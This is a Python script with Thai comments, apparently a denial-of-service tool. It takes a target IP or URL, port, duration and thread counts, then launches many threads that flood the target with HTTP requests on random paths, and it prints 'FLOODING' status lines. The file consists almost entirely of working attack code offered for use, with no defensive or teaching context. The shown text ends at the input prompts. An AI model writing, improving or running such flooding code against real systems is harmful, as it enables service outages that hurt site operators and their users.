# ตรวจสอบการติดตั้งไลบรารี
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} ไม่สามารถติดตั้งได้ . . . .")
    exit()

# ฟังก์ชันและคลาส

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def status_print(ip,port,thread_id,rps,path_get):
    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")

def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# การโจมตี DOS
def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
    rps = 0
    url_path = ''
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
            rps += 2
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass
    status_print(ip,port,id,rps,path_get_loader)

status_code = False
id_loader = 0

def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
    global status_code,id_loader
    if status_code == True:
        while time.time() < time_loader:
            for _ in range(spam_loader):
                id_loader += 1
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()

# ข้อมูล
banner = f"""
{Fore.YELLOW}     __..---..__
{Fore.YELLOW} ,-='  {Fore.RED}/  |  \  {Fore.YELLOW}`=-.
{Fore.WHITE}:--..___________..--;
{Fore.WHITE} \.,_____________,./
 
{Fore.RED}╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐
{Fore.LIGHTRED_EX}╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ 
{Fore.WHITE}╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘  {Fore.YELLOW}# (OFFLINE) {Fore.LIGHTYELLOW_EX}TOOL #{Fore.RESET}"""

print(banner)
host = ""
ip = ""
target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
port_loader = int(input(f"{Fore.YELLOW}PORT>"))
time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (ค่าเริ่มต้น=250)>"))
spam_loader = int(input(f"{Fore.RED}จำนวน SPAM THREAD (ค่าเริ่มต้น=50 หรือ 299)>"))
create_thread = int(input(F"{Fore.LIGHTGREEN_EX}จำนวน THREAD ที่จะสร้าง (ค่าเริ่มต้น=5)>"))